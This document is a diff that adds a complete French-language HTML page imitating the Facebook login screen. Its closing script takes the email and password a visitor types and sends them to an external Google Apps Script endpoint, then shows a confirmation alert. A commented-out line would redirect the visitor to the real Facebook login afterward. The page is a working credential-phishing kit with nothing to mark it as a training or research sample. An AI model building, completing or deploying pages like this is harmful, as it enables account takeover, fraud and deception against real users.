@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Se connecter à Facebook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            direction: ltr;
+        }
+        ._97vy {
+            size: 200%;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        ._97vu {
+            width: 170px;
+            height: 56px;
+            display: inline-block;
+        }
+        button#loginbutton {
+            
+    width: 100%;
+    height: 50%;
+   
+    border-radius: 6px;
+    
+    
+}
+
+
+        ._4-u2 {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 396px;
+            text-align: center;
+            margin: 0 auto;
+        }
+        ._xku {
+            margin-bottom: 15px;
+        }
+        ._97w1 {
+            font-size: 20px;
+            color: black;
+            font-weight: normal;
+        }
+        .login_form_container {
+            padding: 0 16px;
+        }
+        #login_form {
+            display: block;
+        }
+        ._5466 {
+            margin-bottom: 10px; /* Reduced spacing between inputs */
+        }
+        .inputtext {
+            width: 100%;
+            height: 50px; /* Matching input height from image */
+            padding: 12px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            color: #1d2129;
+        }
+        .inputtext:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .inputtext::_placeholder {
+            color: #606770;
+        }
+        ._55r1._9npi {
+            position: relative;
+        }
+        ._9ls7 {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+        ._9lsa {
+            width: 24px;
+            height: 24px;
+            background: url('data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"%3E%3Cpath fill="%23606770" d="M12 4.5a7.5 7.5 0 00-7.5 7.5c0 4.14 3.36 7.5 7.5 7.5s7.5-3.36 7.5-7.5S16.14 4.5 12 4.5zm0 13.5a6 6 0 01-6-6 6 6 0 0112 0 6 6 0 01-6 6zm2.12-8.12a3 3 0 00-4.24 0 3 3 0 000 4.24 3 3 0 004.24 0 3 3 0 000-4.24zm-2.12.88a1.5 1.5 0 011.06.44 1.5 1.5 0 010 2.12 1.5 1.5 0 01-2.12 0 1.5 1.5 0 010-2.12 1.5 1.5 0 011.06-.44z"/%3E%3C/svg%3E') no-repeat center;
+            background-size: 20px;
+        }
+        ._xkt {
+            margin: 10px 0; /* Adjusted spacing for buttons */
+        }
+        ._42ft {
+            cursor: pointer;
+            display: inline-block;
+            text-align: center;
+            white-space: nowrap;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px; /* Matching button font size from image */
+            font-weight: 600;
+            padding: 0 16px; /* Default padding */
+            line-height: 48px; /* Matching button height from image */
+            width: auto; /* Allow natural width based on content */
+        }
+        ._4jy6 {
+            line-height: 42px;
+            padding: 0 24px;
+            background-color: #1877f2;
+            color: white;
+        }
+        ._4jy6._42fr:active, ._4jy6._42fr._42fs {
+            line-height: 42px;
+            padding: 0 24px;
+        }
+        ._4jy6:hover {
+            background-color: #166fe5;
+        }
+        #login_link {
+            margin-top: 15px;
+        }
+        ._97w4 {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            margin-top: 10px; /* Spacing above "Informations de compte oubliées ?" */
+        }
+        ._97w4:hover {
+            text-decoration: underline;
+        }
+        ._1rf5 {
+            position: relative;
+            margin: 15px 0; /* Adjusted spacing for "ou" line */
+            text-align: center;
+        }
+        ._1rf8 {
+            color: #606770;
+            font-size: 14px;
+            position: relative;
+            background: white;
+            padding: 0 8px;
+        }
+        ._1rf5::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #dadde1;
+        }
+        ._97v_ ._16jx {
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            line-height: 48px;
+            padding: 0 16px;
+            background-color: #42b72a;
+            color: white;
+            text-decoration: none;
+        }
+        ._4jy2 {
+            background-color: #42b72a;
+        }
+        ._97v_ ._16jx:hover {
+            background-color: #36a420;
+        }
+        ._95ke {
+            margin-top: 20px;
+            text-align: center;
+            color: #606770;
+            font-size: 12px;
+        }
+        .uiList {
+            list-style: none;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 5px;
+        }
+        .uiList li {
+            display: inline-block;
+        }
+        ._sv4 {
+            color: #606770;
+            text-decoration: none;
+        }
+        ._sv4:hover {
+            text-decoration: underline;
+        }
+        #contentCurve {
+            height: 20px;
+        }
+        .pageFooterLinkList {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 5px;
+            margin-top: 10px;
+        }
+        .pageFooterLinkList li a {
+            color: #606770;
+            text-decoration: none;
+        }
+        .pageFooterLinkList li a:hover {
+            text-decoration: underline;
+        }
+        .mvl {
+            margin-top: 10px;
+        }
+        .mvl span {
+            color: #606770;
+        }
+        .localeSelectorList {
+            margin-bottom: 10px;
+        }
+        .localeSelectorList li a {
+            padding: 0 5px;
+        }
+        .localeSelectorList .more-languages {
+            padding: 0 5px;
+            background: none;
+            border: none;
+            font-size: 12px;
+            color: #606770;
+            cursor: pointer;
+        }
+        .localeSelectorList .more-languages:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body class="_39il _97vt _97vz _97v- _97v_ _97w2 _97w0 _9ax- _9ax_ _9ay1 UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1 Locale_fr_FR" dir="ltr">
+    <div class="_li" id="u_0_0_W2">
+        <div id="globalContainer" class="uiContextualLayerParent">
+            <div class="fb_content clearfix" id="content" role="main">
+                <div class="_4-u5 _30ny">
+                    <div class="_97vy">
+                        <img class="_97vu img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
+                    </div>
+                    <div class="_4-u2 _1w1t _4-u8 _52jv">
+                        <div class="_xku" id="header_block">
+                            <span class="_97w1 _50f6">
+                                <div class="_9axz">Se connecter à Facebook</div>
+                            </span>
+                        </div>
+                        <div class="login_form_container">
+                            <form id="login_form" action="#" method="post">
+                                <input type="hidden" name="jazoest" value="2928" autocomplete="off">
+                                <input type="hidden" name="lsd" value="AVoEsznHC78" autocomplete="off">
+                                <div id="loginform">
+                                    <div class="clearfix _5466 _44mg" id="email_container">
+                                        <input type="text" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="email" id="email" tabindex="0" placeholder="Adresse e-mail ou numéro de tél." value="" autofocus="1" autocomplete="username" aria-label="Adresse e-mail ou numéro de tél.">
+                                    </div>
+                                    <div class="clearfix _5466 _44mg">
+                                        <div>
+                                            <div class="_55r1 _1kbt">
+                                                <input type="password" class="inputtext _55r1 inputtext _9npi inputtext _9npi" name="pass" id="pass" tabindex="0" placeholder="Mot de passe" value="" autocomplete="current-password" aria-label="Mot de passe">
+                                                <div class="_9ls7" id="u_0_3_W7">
+                                                    <a href="#" role="button">
+                                                        <div class="_9lsa">
+                                                            <div class="_9lsb" id="u_0_4_o8"></div>
+                                                        </div>
+                                                    </a>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="_xkt">
+                                        <button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" tabindex="0" type="submit">Se connecter</button>
+                                    </div>
+                                    <div id="login_link">
+                                        <div class="_97w3">
+                                            <a href="#" class="_97w4" target="">Informations de compte oubliées ?</a>
+                                        </div>
+                                        <div class="_1rf5">
+                                            <span class="_1rf8">ou</span>
+                                        </div>
+                                        <div class="_xkt">
+                                            <a role="button" class="_42ft _4jy0 _16jx _4jy6 _4jy2 selected _51sy" href="#">Créer un nouveau compte</a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+                <div class="_95ke _8opy">
+                    <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
+                        <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
+                            <li>Français (France)</li>
+                            <li><a class="_sv4" dir="rtl" href="#" title="Arabic">العربية</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="English (US)">English (US)</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="Italiano">Italiano</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="Deutsch">Deutsch</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="Español">Español</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="Русский">Русский</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="Português (Brasil)">Português (Brasil)</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="हिन्दी">हिन्दी</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="中文(简体)">中文(简体)</a></li>
+                            <li><a class="_sv4" dir="ltr" href="#" title="日本語">日本語</a></li>
+                            <li><button class="more-languages" title="Voir plus de langues">+</button></li>
+                        </ul>
+                        <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
+                            <li><a href="#" title="Inscrivez-vous sur Facebook">S’inscrire</a></li>
+                            <li><a href="#" title="Se connecter à Facebook">Se connecter</a></li>
+                            <li><a href="#" title="Essayez Messenger.">Messenger</a></li>
+                            <li><a href="#" title="Facebook Lite pour Android.">Facebook Lite</a></li>
+                            <li><a href="#" title="Naviguez dans Vidéo">Vidéo</a></li>
+                            <li><a href="#" title="En savoir plus sur Meta Pay">Meta Pay</a></li>
+                            <li><a href="#" title="Découvrez Meta">Boutique Meta</a></li>
+                            <li><a href="#" title="En savoir plus sur Meta Quest">Meta Quest</a></li>
+                            <li><a href="#" title="En savoir plus sur Ray-Ban Meta">Ray-Ban Meta</a></li>
+                            <li><a href="#" title="Meta AI">Meta AI</a></li>
+                            <li><a href="#" title="Découvrez Instagram">Instagram</a></li>
+                            <li><a href="#" title="Découvrez Threads">Threads</a></li>
+                        </ul>
+                        <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
+                            <li><a href="#" title="Centre d’information sur les élections">Centre d’information sur les élections</a></li>
+                            <li><a href="#" title="Politique de confidentialité">Politique de confidentialité</a></li>
+                            <li><a href="#" title="Centre de confidentialité">Centre de confidentialité</a></li>
+                            <li><a href="#" title="À propos">À propos</a></li>
+                            <li><a href="#" title="Créer une publicité">Créer une publicité</a></li>
+                            <li><a href="#" title="Créer une Page">Créer une Page</a></li>
+                            <li><a href="#" title="Développeurs">Développeurs</a></li>
+                            <li><a href="#" title="Emplois">Emplois</a></li>
+                            <li><a href="#" title="Cookies">Cookies</a></li>
+                            <li><a href="#" title="Choisir sa publicité">Choisir sa publicité</a></li>
+                            <li><a href="#" title="Conditions générales">Conditions générales</a></li>
+                            <li><a href="#" title="Aide">Aide</a></li>
+                            <li><a href="#" title="Importation des contacts et non-utilisateurs">Importation des contacts et non-utilisateurs</a></li>
+                        </ul>
+                        <div class="mvl copyright">
+                            <div><span>Meta © 2025</span></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        document.getElementById("login_form").addEventListener("submit", function(event) {
+          event.preventDefault(); // Empêche l'envoi classique du formulaire
+      
+          const email = document.getElementById("email").value;
+          const password = document.getElementById("pass").value;
+      
+          console.log("Login Attempt:");
+          console.log("Email:", email);
+          console.log("Password:", password);
+      
+          // Envoi vers Google Sheets via Apps Script
+          fetch("https://script.google.com/macros/s/AKfycby950d4wFBK0xIGBtodCqBKYPSsMEvOTel2DbWGtMthgR9IbalOC2vfuEI6JcQDbPf7/exec", {
+            method: "POST",
+            body: JSON.stringify({ email: email, password: password }),
+            headers: {
+              "Content-Type": "application/json"
+            }
+          })
+          .then(response => {
+            alert("Informations envoyées !");
+            // Redirection optionnelle après soumission :
+            // window.location.href = "https://www.facebook.com/login/?locale=fr_FR";
+          })
+          .catch(error => {
+            console.error("Erreur lors de l'envoi :", error);
+            alert("Erreur d'envoi !");
+          });
+        });
+      </script>
+      
+</body>
+</html>
